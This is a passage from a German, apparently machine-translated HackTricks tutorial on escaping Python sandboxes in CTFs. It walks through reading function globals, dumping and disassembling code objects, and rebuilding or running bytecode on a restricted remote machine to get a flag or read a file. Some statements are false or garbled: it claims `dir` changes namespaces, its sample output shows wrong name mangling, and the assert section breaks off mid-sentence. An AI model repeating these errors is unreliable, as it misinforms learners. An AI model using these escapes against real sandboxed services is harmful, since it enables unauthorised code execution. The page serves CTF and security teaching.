['__doc__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'comb', 'copysign', 'cos', 'cosh', 'degrees', 'dist', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'perm', 'pi', 'pow', 'prod', 'radians', 'remainder', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']
```

Die `dir` Funktion kann auch verwendet werden, um den Namespace eines Objekts zu ändern. Dies kann nützlich sein, um auf private oder versteckte Attribute und Methoden zuzugreifen, die normalerweise nicht sichtbar sind.

Beispiel:

```python
class MyClass:
    def __init__(self):
        self.public_attribute = "public"
        self._private_attribute = "private"
    
    def public_method(self):
        print("This is a public method.")
    
    def _private_method(self):
        print("This is a private method.")

my_object = MyClass()

print(dir(my_object))  # Gibt die Namen im Namespace von my_object aus, einschließlich der privaten Attribute und Methoden
```

Ausgabe:

```
['_MyClass__private_attribute', '_MyClass__private_method', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_private_attribute', '_private_method', 'public_attribute', 'public_method']
```

Die `dir` Funktion ist ein nützliches Werkzeug, um den Inhalt eines Namespace zu überprüfen und auf private Attribute und Methoden zuzugreifen.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` und `func_globals` (gleich) erhalten die globale Umgebung. Im Beispiel sehen Sie einige importierte Module, einige globale Variablen und ihren deklarierten Inhalt:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Hier finden Sie weitere Orte, um auf globale Variablen zuzugreifen**](./#globals-and-locals)

### **Zugriff auf den Funktionscode**

**`__code__`** und `func_code`: Sie können auf dieses **Attribut** der Funktion **zugreifen**, um das Code-Objekt der Funktion zu **erhalten**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Code-Informationen erhalten

Um Code-Informationen zu erhalten, können Sie verschiedene Techniken verwenden:

#### 1. Inspektionsfunktionen

Python bietet verschiedene Funktionen, mit denen Sie Code zur Laufzeit inspizieren können. Einige dieser Funktionen sind:

- `dir()`: Gibt eine Liste aller Namen im aktuellen Gültigkeitsbereich zurück.
- `type()`: Gibt den Typ eines Objekts zurück.
- `id()`: Gibt die eindeutige ID eines Objekts zurück.
- `getattr()`: Gibt den Wert eines Attributs eines Objekts zurück.
- `globals()`: Gibt ein Wörterbuch mit globalen Symbolen zurück.
- `locals()`: Gibt ein Wörterbuch mit lokalen Symbolen zurück.

#### 2. `inspect`-Modul

Das `inspect`-Modul bietet Funktionen zum Abrufen von Informationen über geladene Module, Klassen, Methoden, Funktionen usw. Einige nützliche Funktionen sind:

- `inspect.getmembers()`: Gibt eine Liste von Namen und Werten für ein Objekt zurück.
- `inspect.getsource()`: Gibt den Quellcode eines Objekts zurück.
- `inspect.getfile()`: Gibt den Dateinamen an, in dem ein Objekt definiert ist.
- `inspect.getmodule()`: Gibt das Modul zurück, in dem ein Objekt definiert ist.

#### 3. `dis`-Modul

Das `dis`-Modul ermöglicht die Disassemblierung von Python-Bytecode. Sie können es verwenden, um den generierten Bytecode für eine Funktion oder Methode anzuzeigen. Einige nützliche Funktionen sind:

- `dis.dis()`: Gibt den disassemblierten Code für eine Funktion oder Methode aus.
- `dis.show_code()`: Gibt den Quellcode einer Funktion oder Methode zusammen mit dem disassemblierten Code aus.

#### 4. `ast`-Modul

Das `ast`-Modul ermöglicht die Analyse und Manipulation von Python-Code auf abstrakter Syntaxebene. Sie können es verwenden, um den abstrakten Syntaxbaum (AST) einer Funktion oder eines Moduls zu erhalten. Einige nützliche Funktionen sind:

- `ast.parse()`: Analysiert eine Zeichenkette mit Python-Code und gibt den AST zurück.
- `ast.dump()`: Gibt eine textuelle Darstellung des AST zurück.

#### 5. `inspect.signature()`-Funktion

Die `inspect.signature()`-Funktion ermöglicht es Ihnen, die Signatur einer Funktion oder Methode abzurufen. Die Signatur enthält Informationen über die Parameter und Rückgabewerte der Funktion.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Disassemblieren einer Funktion**

Um den Code einer Funktion zu analysieren und zu verstehen, können wir den Disassemblierungsprozess verwenden. Dies ermöglicht es uns, den maschinennahen Code zu betrachten und die Funktionsweise der Funktion im Detail zu untersuchen.

In Python können wir die `dis`-Bibliothek verwenden, um eine Funktion zu disassemblieren. Hier ist ein Beispiel, wie wir dies tun können:

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

Dieser Code disassembliert die Funktion `my_function` und gibt den maschinennahen Code aus. Durch die Analyse des disassemblierten Codes können wir die einzelnen Schritte und Operationen der Funktion verstehen.

Die Ausgabe des obigen Codes sieht etwa so aus:

```plaintext
  4           0 LOAD_CONST               1 (5)
              2 STORE_FAST               0 (x)

  5           4 LOAD_CONST               2 (10)
              6 STORE_FAST               1 (y)

  6           8 LOAD_FAST                0 (x)
             10 LOAD_FAST                1 (y)
             12 BINARY_ADD
             14 STORE_FAST               2 (z)

  7          16 LOAD_GLOBAL              0 (print)
             18 LOAD_FAST                2 (z)
             20 CALL_FUNCTION            1
             22 POP_TOP
             24 LOAD_CONST               0 (None)
             26 RETURN_VALUE
```

Diese Ausgabe zeigt die einzelnen Anweisungen und Operationen, die in der Funktion `my_function` ausgeführt werden. Jede Zeile enthält den Befehl, den Opcode und die Operanden.

Durch die Disassemblierung einer Funktion können wir den Code im Detail analysieren und verstehen, was hinter den einzelnen Anweisungen und Operationen steckt. Dies kann uns helfen, den Code zu optimieren, Fehler zu beheben oder Sicherheitslücken zu identifizieren.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Beachten Sie, dass **wenn Sie `dis` nicht in der Python-Sandbox importieren können**, Sie den **Bytecode** der Funktion (`get_flag.func_code.co_code`) erhalten und ihn lokal **disassemblieren** können. Sie werden den Inhalt der geladenen Variablen (`LOAD_CONST`) nicht sehen, aber Sie können sie aus (`get_flag.func_code.co_consts`) erraten, da `LOAD_CONST` auch den Offset der geladenen Variable angibt.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Kompilieren von Python

Nun stellen wir uns vor, dass Sie auf irgendeine Weise die Informationen über eine Funktion abrufen können, die Sie nicht ausführen können, aber ausführen müssen.\
Wie im folgenden Beispiel können Sie auf das Code-Objekt dieser Funktion zugreifen, aber allein durch das Lesen der Disassembly wissen Sie nicht, wie Sie die Flagge berechnen können (_stellen Sie sich eine komplexere `calc_flag`-Funktion vor_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Erstellen des Code-Objekts

Zunächst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion leaked auszuführen:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Je nach Python-Version kann die **Reihenfolge** der **Parameter** von `code_type` unterschiedlich sein. Der beste Weg, um die Reihenfolge der Parameter in der Python-Version, die Sie verwenden, herauszufinden, besteht darin, Folgendes auszuführen:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Nachbildung einer durchgesickerten Funktion

{% hint style="warning" %}
Im folgenden Beispiel werden wir alle Daten nehmen, die benötigt werden, um die Funktion direkt aus dem Funktionscode-Objekt wiederherzustellen. In einem **echten Beispiel** sind alle **Werte**, um die Funktion auszuführen, **`code_type`**, das, was **du durchsickern lassen musst**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Umgehung von Verteidigungen

In den vorherigen Beispielen am Anfang dieses Beitrags können Sie sehen, **wie Sie beliebigen Python-Code mit der `compile`-Funktion ausführen** können. Dies ist interessant, weil Sie **ganze Skripte** mit Schleifen und allem anderen in einer **einzigen Zeile** ausführen können (und wir könnten dasselbe mit **`exec`** tun).\
Wie auch immer, manchmal kann es nützlich sein, ein **kompiliertes Objekt** auf einem lokalen Rechner zu erstellen und es auf der **CTF-Maschine** auszuführen (zum Beispiel, weil wir die `compile`-Funktion in der CTF nicht haben).

Zum Beispiel, lassen Sie uns manuell eine Funktion kompilieren und ausführen, die _./poc.py_ liest:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Wenn Sie keinen Zugriff auf `eval` oder `exec` haben, können Sie eine **geeignete Funktion** erstellen, aber der direkte Aufruf wird in der Regel mit der Fehlermeldung _Konstruktor im eingeschränkten Modus nicht zugänglich_ fehlschlagen. Sie benötigen also eine **Funktion außerhalb der eingeschränkten Umgebung, um diese Funktion aufzurufen**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Decompilieren von kompiliertem Python

Mit Tools wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann man den gegebenen kompilierten Python-Code **decompilieren**.

**Schau dir dieses Tutorial an**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Sonstiges Python

### Assert

Python, das mit der Option `-O` für Optimierungen ausgeführt wird, entfernt `assert`-Anweisungen und jeglichen Code, der von dem Wert von **debug** abhängt.\
Daher werden Überprüfungen wie
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Referenzen

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
